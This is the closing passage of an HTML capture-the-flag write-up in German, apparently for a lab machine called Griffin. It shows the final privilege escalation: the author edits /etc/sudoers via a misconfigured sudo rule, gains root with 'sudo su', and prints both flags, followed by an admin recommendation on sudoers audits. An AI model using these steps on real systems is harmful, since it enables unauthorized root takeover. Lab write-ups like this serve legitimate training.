+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe `sudo mg /etc/sudoers` aus, füge die Zeile `peter ALL=(ALL:ALL) ALL` hinzu und speichere die Datei. Ein anschließender `sudo -l` bestätigt, dass ich nun volle `root`-Berechtigungen habe. Mit `sudo su` wechsle ich endgültig zum `root`-Benutzer.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff war erfolgreich. Ich habe die vollständige Kontrolle über das System erlangt. Der Weg führte über eine Kette von Benutzerwechseln und der Ausnutzung von `sudo`-Fehlkonfigurationen. Ich kann nun die finale Root-Flag lesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Test ist abgeschlossen. Der Weg zur Kompromittierung ist vollständig dokumentiert und alle Flags sind als Beweis gesichert.<br><strong>Empfehlung (Admin):</strong> Dies zeigt, wie eine einzige unsichere `sudo`-Regel die gesamte Sicherheit des Systems untergraben kann. Führen Sie regelmäßige Audits der `/etc/sudoers`-Datei durch und befolgen Sie das Prinzip der geringsten Rechte strikt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">peter@Griffin:/home/lois$ <span class="command">sudo mg /etc/sudoers</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">peter@Griffin:/home/lois$ <span class="command">sudo su</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+<span class="password">root@Griffin:/home/lois# id</span>
+uid=0(root) gid=0(root) groups=0(root)
+root@Griffin:/home/lois# 
+</pre>
+                </div>
+            </div>
+        </section>
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/lois/user.txt</div>
+                    <div class="flag-value"><span class="password">flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">flag{root-be93b7d7f0a30d5159c0460874e6e015}</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div>
+
+    <footer class="footer">
+        <p>Ben C. - Cyber Security Reports</p>
+        <p>Berichtsdatum: 4. August 2025</p>
+    </footer>
+
+</body>
+</html>
